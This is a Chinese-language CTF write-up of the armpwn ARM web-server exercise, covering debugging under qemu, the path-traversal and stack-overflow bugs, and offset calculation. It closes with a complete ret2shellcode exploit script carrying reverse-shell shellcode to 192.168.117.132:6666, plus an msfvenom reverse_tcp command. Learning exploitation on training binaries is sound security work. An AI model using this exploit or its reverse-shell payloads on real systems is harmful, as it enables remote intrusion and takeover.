# ARM Stack OverFlow


## 0x00 知识准备


### gdb调试子进程
```
set follow-fork-mode child
```


### Qemu调子进程

>为什么Qemu无法跟进子进程？
QEMU gdbstub不知道操作系统的进程或线程，只有VCPU执行连续的指令流，fork 没有特殊说明，也不会通知 gdbstub，也就无法命中断点。
https://qemu-devel.nongnu.narkive.com/xPi7bdr1/how-to-follow-a-child-process-created-in-the-guest-os


1. Patch fork：删除fork()，处于同一个进程，方便调试。   
2. Hook fork。   
3. 用实体环境调试，eg 树莓派。     


### shellcode

- msfvenom
- http://shell-storm.org/shellcode/



## 0x01 PWN

### 1.题目

>题目来源：https://github.com/saelo/armpwn   

可选择2种模式：   
- easy：通过qemu运行，重新编译了一遍，关闭了所有保护，目标RCE。   
- hard：题目自带的二进制，推荐运行在树莓派上，开启了所有保护，目标RCE。  

#### Hard模式:
文件位置：[websrv_easy](./websrv_hard/)
作者提供的binary所有保护全开了，需要通过/proc/self/map泄露信息，这不适合qemu启动，推荐在树莓派上运行。   
#### Easy模式:
文件位置：[websrv_easy](./websrv_easy/)
本次题目提供的二进制重新编译，关闭栈保护，通过qemu模拟运行。    
 
启动：`sudo qemu-arm -L /usr/arm-linux-gnueabihf/ ./websrv `    
>`/lib/ld-linux-armhf.so.3: No such file or directory`报错。    
sudo apt-get install libc6-armhf-cross 添加参数 -L    

本次练习选择easy模式进行。    

### 2.分析
该程序是实现的一个web中间件。
```
pwn checksec websrv 
[*] '/home/mi/CTF/pwn-exercise/linux_arm_stack/arm_pwn_websrv/websrv_easy/websrv'
    Arch:     arm-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000)
    RWX:      Has RWX segments
```
没有任何保护可以直接ret2shellcode。    
#### 目录穿越任意读
该程序存在目录穿越，可以读任意文件，可以通过proc读取内存布局和二进制程序，但是我们把栈保护给关了，所以该漏洞在本次题目中无需使用。    
漏洞成因：url的path存放在s变量中，没有过滤，直接拼接在webroot/的v11变量，进而读取文件。
```
int __fastcall handle_req(int a1, int a2, int a3)
{
  char *v4; // r4
  int v5; // r0
  size_t na; // [sp+4h] [bp-828h]
  char v11[12]; // [sp+10h] [bp-81Ch] BYREF
  int v12; // [sp+810h] [bp-1Ch]
  FILE *stream; // [sp+814h] [bp-18h]
  _BYTE *v14; // [sp+818h] [bp-14h]
  void *s; // [sp+81Ch] [bp-10h]

  if ( memcmp((const void *)a2, "GET", 3u) )
    return send_error(a1, 501, "Not Implemented");
  s = (void *)(a2 + 4);
  v14 = memchr((const void *)(a2 + 4), 32, a3 - 4);
  if ( !v14 )
    return send_error(a1, 400, "Bad Request");
  *v14 = 0;
  if ( !strcmp((const char *)s, "/") )
    s = "index.html";
  if ( !strcmp((const char *)s, "/ledon") || !strcmp((const char *)s, "/ledoff") )
    return handle_led_cmd(a1, (char *)s + 1);
  v4 = inet_ntoa(*(struct in_addr *)&client.sa_data[2]);
  v5 = htons(*(uint16_t *)client.sa_data);
  printf("%s:%d request for file '%s'\n", v4, v5, (const char *)s);
  strcpy(v11, "webroot/");
  strcat(v11, (const char *)s);
  stream = fopen(v11, "r");
  if ( !stream )
    return send_error(a1, 404, "Not Found");
  fseek(stream, 0, 2);
  v12 = ftell(stream);
  fseek(stream, 0, 0);
  http_send(a1, "HTTP/1.1 200 OK\r\n");
  http_send(a1, "Content-Type: text/html\r\n");
  http_send(a1, "Content-Length: %d\r\n\r\n", v12);
  while ( 1 )
  {
    na = fread(v11, 1u, 0x800u, stream);
    if ( !na )
      break;
    send(a1, v11, na, 0);
  }
  fclose(stream);
  return 200;
}
```
#### 栈溢出
`handle_single_request`是处理请求的的函数，http_dest指针指的是v5的空间，这ida识别有点问题，`recv(a1, &buf, 0x800u, 0)`循环读取socket的数据，将`\r\n\r\n`后的数据放在v5，进而产生栈溢出。    
```
int __fastcall handle_single_request(int a1)
{
  int v2; // r3
  _BYTE v5[20]; // [sp+8h] [bp-1014h] BYREF
  size_t v6; // [sp+1008h] [bp-14h]
  char *nptr; // [sp+100Ch] [bp-10h]
  void *http_dest; // [sp+1010h] [bp-Ch]
  size_t n; // [sp+1014h] [bp-8h]

  http_dest = v5;
  do
  {
    if ( !bufsz )
    {
      bufsz = recv(a1, &buf, 0x800u, 0);
      if ( bufsz <= 0 )
        return -1;
    }
    memcpy(http_dest, &buf, bufsz);             // 溢出
    http_dest = (char *)http_dest + bufsz;
    bufsz = 0;
    nptr = (char *)memmem(v5, (_BYTE *)http_dest - v5, "\r\n\r\n", 4);
  }
  while ( !nptr );
  bufsz = (_BYTE *)http_dest - (nptr + 4);
  http_dest = nptr + 4;
  memcpy(&buf, nptr + 4, bufsz);
  *(_BYTE *)http_dest = 0;
  nptr = (char *)strcasestr(v5, "Content-Length:");
  if ( nptr )
  {
    for ( nptr += 15; ((*_ctype_b_loc())[(unsigned __int8)*nptr] & 0x2000) != 0; ++nptr )
      ;
    n = atoi(nptr);
    while ( (int)n > 0 )
    {
      if ( bufsz )
      {
        v2 = bufsz;
        if ( (int)n < bufsz )
          v2 = n;
        v6 = v2;
        memcpy(http_dest, &buf, v2);
        http_dest = (char *)http_dest + v6;
        n -= v6;
        bufsz -= v6;
        if ( bufsz )
          memmove(&buf, (char *)&buf + v6, bufsz);
      }
      else
      {
        v6 = recv(a1, http_dest, n, 0);
        if ( (int)v6 <= 0 )
          return -1;
        n -= v6;
        http_dest = (char *)http_dest + v6;
      }
    }
  }
  return handle_req(a1, v5, (_BYTE *)http_dest - v5);
}
```

请求如下：

```
request = b'GET ' + str2byte(path) + b' HTTP/1.1\r\nContent-Length: ' + str2byte(str(len(boby))) + b'\r\n\r\n' + boby
```

### 3.调试


#### Patch fork
将fork替换成nop，让返回值等于0.  
file : [websrv_nofork](./websrv_easy/websrv_nofork)  
替换为如下：    
```
.text:000117B8 00 00 A0 E1                 NOP                     ; No Operation
.text:000117BC 00 30 A0 E3                 MOV     R3, #0          ; Rd = Op2
.text:000117C0 00 00 A0 E1                 NOP                     ; No Operation
.text:000117C4 00 00 A0 E1                 NOP                     ; No Operation
.text:000117C8 00 00 53 E3                 CMP     R3, #0          ; Set cond. codes on Op1 - Op2
```


### gdbserver运行

`sudo qemu-arm -g 1234 -L /usr/arm-linux-gnueabihf/ ./websrv ` 
### 计算偏移

通过cyclic()计算得出为0xfec。    

```
Program received signal SIGSEGV, Segmentation fault.
0x61756f62 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────
*R0   0xffffffff
*R1   0xe
*R2   0x10
*R3   0xffffffff
*R4   0xf66cd4f0 ◂— mrchs  p2, #1, r3, c7, c1, #1 /* 0x2e373231; '127.0.0.1' */
 R5   0x0
 R6   0x0
 R7   0x0
 R8   0x0
 R9   0x0
*R10  0xf67fe000 —▸ 0x27f44 ◂— 0
*R11  0x61746f62 ('bota')
 R12  0x0
*SP   0xf6fff5a0 ◂— 'bovabowaboxaboyabozabpbabpcabpdabpeabpfabpgabphabpiabpjabpkabplabpmabpnabpoabppabpqabprabpsabptabpuabpvabpwabpxa'
*PC   0x61756f62 ('boua')
───────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────
Invalid address 0x61756f62
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ sp 0xf6fff5a0 ◂— 'bovabowaboxaboyabozabpbabpcabpdabpeabpfabpgabphabpiabpjabpkabplabpmabpnabpoabppabpqabprabpsabptabpuabpvabpwabpxa'
01:0004│    0xf6fff5a4 ◂— 'bowaboxaboyabozabpbabpcabpdabpeabpfabpgabphabpiabpjabpkabplabpmabpnabpoabppabpqabprabpsabptabpuabpvabpwabpxa'
02:0008│    0xf6fff5a8 ◂— 'boxaboyabozabpbabpcabpdabpeabpfabpgabphabpiabpjabpkabplabpmabpnabpoabppabpqabprabpsabptabpuabpvabpwabpxa'
03:000c│    0xf6fff5ac ◂— 'boyabozabpbabpcabpdabpeabpfabpgabphabpiabpjabpkabplabpmabpnabpoabppabpqabprabpsabptabpuabpvabpwabpxa'
04:0010│    0xf6fff5b0 ◂— 'bozabpbabpcabpdabpeabpfabpgabphabpiabpjabpkabplabpmabpnabpoabppabpqabprabpsabptabpuabpvabpwabpxa'
05:0014│    0xf6fff5b4 ◂— 'bpbabpcabpdabpeabpfabpgabphabpiabpjabpkabplabpmabpnabpoabppabpqabprabpsabptabpuabpvabpwabpxa'
06:0018│    0xf6fff5b8 ◂— 'bpcabpdabpeabpfabpgabphabpiabpjabpkabplabpmabpnabpoabppabpqabprabpsabptabpuabpvabpwabpxa'
07:001c│    0xf6fff5bc ◂— 'bpdabpeabpfabpgabphabpiabpjabpkabplabpmabpnabpoabppabpqabprabpsabptabpuabpvabpwabpxa'
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► f 0 0x61756f62
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

## 0x02 EXP

### ret2shellcode

获取的boby数据会放在bss段上，地址为0x000221C0，我们只需要把shellcode放在此空间就好。  
因为这个web server 需要反弹shell，先用的msfvenom生成，但是能连接会话无法执行命令。   
```
msfvenom -p linux/armle/shell/reverse_tcp LHOST=192.168.117.132 LPORT=6666 -f py -o msf.py
```
>ARMEB = ARM EABI Big-endian ,也有称为ARMEB     #大端字节序    
ARMEL = ARM EABI Little-endian,也有称为ARMLE    #小端字节序

最后找个反弹shell测试成功：http://shell-storm.org/shellcode/files/shellcode-821.php     

如何验证shellcode是否有效，可以将shellcode转成elf，在通过qemu-arm执行来验证。    
- [test_shellocde.py](./test_shellocde.py)
```python
from pwn import *
context(arch='arm',os='linux')
shellcode = asm(shellcraft.sh())
backdoor  = make_elf(shellcode)
f = open('backdoor','wb')
f.write(backdoor)
f.close()
```
最后exp，192.168.117.132监听6666端口，等待反弹shell。    
file: [exp.py](./exp.py)
```python
from pwn import *
context(arch='arm',log_level='debug')
conn = remote('127.0.0.1',80)

def str2byte(s):
    return str.encode(s)

def request(socketfd,boby,path='/'):
    request = b'GET ' + str2byte(path) + b' HTTP/1.1\r\nContent-Length: ' + str2byte(str(len(boby))) + b'\r\n\r\n' + boby
    socketfd.sendline(request)

sc = [

	0x01, 0x10, 0x8F, 0xE2,
	0x11, 0xFF, 0x2F, 0xE1,
	0x02, 0x20, 0x01, 0x21,
	0x92, 0x1a, 0x0f, 0x02,
	0x19, 0x37, 0x01, 0xdf,
	0x06, 0x1c, 0x08, 0xa1,
	0x10, 0x22, 0x02, 0x37,
	0x01, 0xdf, 0x3f, 0x27,
	0x02, 0x21,
	0x30, 0x1c, 0x01, 0xdf,
	0x01, 0x39, 0xfb, 0xd5,
	0x05, 0xa0, 0x92, 0x1a,
	0x05, 0xb4, 0x69, 0x46,
	0x0b, 0x27,0x01, 0xdf,
	0xc0, 0x46,
	#/* struct sockaddr */
	0x02, 0x00,
	#/* port: 6666 */
	0x1a, 0x0a,
	#/* ip: 192.168.117.132 */
	0xc0, 0xa8, 0x75, 0x84,
	#/* "/bin/sh\0" */
	0x2f, 0x62, 0x69, 0x6e,0x2f, 0x73, 0x68, 0x00
]
shellcode = bytes(sc)
payload = shellcode.ljust(0xfec,b'a')  +p32(0x000221C0)
boby= payload
request(conn,boby)
conn.interactive()

```


## Ref


- https://github.com/saelo/armpwn  